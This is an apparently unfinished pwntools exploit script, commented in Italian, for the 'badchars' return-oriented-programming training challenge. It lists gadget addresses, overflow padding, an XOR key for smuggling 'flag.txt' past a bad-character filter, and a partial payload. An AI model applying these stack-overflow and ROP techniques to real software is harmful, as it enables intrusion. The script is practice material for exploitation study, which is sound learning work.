#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

#==================== Payload utils ========================

# Input utente
#
# - carattere: A
# - lunghezza: 32
dummy_input = b'A' * 32

# Salta EBX
#
# - carattere: NA
# - lunghezza: p64 (8 byte - little eldia)
ebx = p64(0)

# print_file()
#
# Indirizzo della funzione print_file
# impementata nella libreria libbadchars.so
# ottenuto col comando $ radbin2 -i badchars
print_func = p64(0x400510)

# Adrress
#
# Indirzzo dove viene scritta
# la stringa byte della flag
# da passare come params* !!! (è un PTR)
# alla funzione print_file
write_addr = p64(0x601040)

# flag
#
# String byte della
# flag da ottenere
flag = b'flag.txt'

# xor's key
#
# Stringa da xorare
# per ottenre "flag.txt"
xor_key_1 = b'suca'
# xor_key_2 = b'0x666c61675d011b15'


#====================== Gadget payload =====================

# ret
#
# Gadget di ret.
# Utilizzato per riallineare
# lo stack 64bit.
retv = p64(0x4004ee)

# pop r14 r15 - usefullGadget
#
# Prendiamo i registri
# r14 e r15 dove è contenuta
# la nostra flag byte.
pop_r14_r15 = p64(0x4006a0)

# xor r15 r14
#
# Gadget di xor [r15] e r14
# per bypassare il controllo di
# badchars.
xor_r15_r14 = p64(0x400628)

# move
#
# Muoviamo im memoria
move = p64(0x400634)

# rdi
#
# passo il primo valore alla
# funzione.
rdi = p64(0x4006a3)

# Payload di attacco
#
# 1 => Input utente
# 2 => ebx
# 3 => return gadget
payload = dummy_input + ebx + retv

io.sendlineafter(b'> ', payload)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

